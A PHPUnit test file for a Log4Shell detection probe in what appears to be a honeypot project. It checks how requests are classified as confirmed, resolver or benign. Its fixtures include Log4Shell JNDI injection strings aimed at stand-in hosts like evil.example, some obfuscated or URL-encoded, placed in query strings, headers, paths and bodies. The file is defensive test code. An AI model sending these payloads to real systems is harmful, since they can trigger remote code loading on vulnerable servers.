<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests;

use Funnypot\Core\Log4ShellProbe;
use Funnypot\Core\RequestContext;
use PHPUnit\Framework\TestCase;

/**
 * FP-0256 — matcher-level coverage of Log4ShellProbe::detect(): the confirmed/resolver severity
 * split, the present() back-compat shim, the new path coverage from the shared OobHaystack, and
 * the retained 16KB cap. The header-borne present() cases stay in AntiFingerprintTest (green via
 * the shim); the wiring/invariant proof is in Log4ShellSeamTest.
 */
final class Log4ShellProbeTest extends TestCase
{
    public function test_detect_splits_confirmed_vs_resolver(): void
    {
        $confirmed = [
            'q=${jndi:ldap://evil.example/a}',
            'q=${jndi:rmi://x/y}',
            'q=${ldap://x/y}',
            'q=${rmi://x/y}',
            'q=${dns://x/y}',
        ];
        foreach ($confirmed as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame(Log4ShellProbe::CONFIRMED, Log4ShellProbe::detect($r), "query: {$query}");
        }

        $resolver = [
            'q=${${lower:j}ndi:dns://x/y}',   // obfuscated: [^}] can't cross the inner } to reach a scheme
            'q=${env:USER}',
            'q=${sys:user.name}',
            'q=${upper:abc}',
            'q=${date:yyyy}',
            'q=${${::-j}}',                    // nested ${${...}}
        ];
        foreach ($resolver as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame(Log4ShellProbe::RESOLVER, Log4ShellProbe::detect($r), "query: {$query}");
        }

        $benign = [
            'q=${price}+total',                // a plain template placeholder, no scheme/resolver
            'q=hello world',
            'q=$notabrace',
        ];
        foreach ($benign as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertNull(Log4ShellProbe::detect($r), "query: {$query}");
        }
    }

    public function test_present_shim_matches_detect(): void
    {
        $cases = [
            new RequestContext('GET', '/', '', ['User-Agent' => '${jndi:ldap://evil.example/a}']),
            new RequestContext('GET', '/', '', ['X-Api-Version' => '${${lower:j}ndi:dns://x/y}']),
            new RequestContext('GET', '/', 'q=${env:USER}'),
            new RequestContext('GET', '/', 'q=hello', ['User-Agent' => 'curl/8.0']),
            new RequestContext('GET', '/', 'q=${price}+total'),
        ];
        foreach ($cases as $i => $r) {
            self::assertSame(
                Log4ShellProbe::detect($r) !== null,
                Log4ShellProbe::present($r),
                "case #{$i}: present() must agree with detect() !== null"
            );
        }
    }

    public function test_payload_in_path_segment_detected(): void
    {
        // FP-0256 delta: the shared OobHaystack scans the PATH, which the old Log4ShellProbe never
        // did (it scanned only query + body + headers). A JNDI string in a path segment now fires.
        $r = new RequestContext('GET', '/api/${jndi:ldap://x/a}/v1');
        self::assertSame(Log4ShellProbe::CONFIRMED, Log4ShellProbe::detect($r));
    }

    public function test_payload_past_the_cap_is_not_scanned(): void
    {
        // The cap is still a cap: a JNDI payload buried past 16KB in the body stays undetected
        // (mirrors OastProbeTest — the body remains last, so the cap truncates it).
        $body = str_repeat('A', 16400) . '${jndi:ldap://late.example/}';
        self::assertNull(Log4ShellProbe::detect(new RequestContext('POST', '/', '', [], $body)));
    }

    public function test_url_encoded_jndi_query_detected(): void
    {
        // FP-0257 (E2c): a single-URL-encoded ${jndi:…} in the query string evaded the baseline,
        // which scanned raw() with NO decode. Scanning build() gives Log4ShellProbe its first decode
        // layer, so the encoded payload is peeled and CONFIRMED. (Uppercase hex proves build()'s
        // pre-decode lowercasing does not break rawurldecode.)
        $r = new RequestContext('GET', '/', 'x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D');
        self::assertSame(Log4ShellProbe::CONFIRMED, Log4ShellProbe::detect($r));
    }
}
